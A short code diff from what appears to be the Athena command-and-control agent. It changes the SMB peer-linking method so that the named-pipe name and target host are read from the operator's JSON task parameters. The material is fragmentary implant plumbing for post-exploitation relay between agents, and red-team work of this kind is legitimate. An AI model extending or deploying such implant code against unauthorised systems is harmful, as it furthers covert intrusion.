@@ -3,6 +3,7 @@ using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using H.Pipes;
 using H.Pipes.Args;
+using Newtonsoft.Json;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -40,17 +41,13 @@ namespace Athena.Config
         //Link to the Athena SMB Agent
         public async Task<bool> Link(MythicJob job)
         {
-
-
-            //string host, string pipename
-            string pipename = "";
-            string host = "";
+            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
 
             try
             {
                 if (this.clientPipe is null || !this.connected)
                 {
-                    this.clientPipe = new PipeClient<DelegateMessage>(pipename, host);
+                    this.clientPipe = new PipeClient<DelegateMessage>(par["pipename"], par["hostname"]);
                     this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                     //this.clientPipe.ExceptionOccurred += (o, args) => Console.WriteLine("Exception: " + args.Exception.Message);
                     this.clientPipe.Connected += (o, args) => this.connected = true;
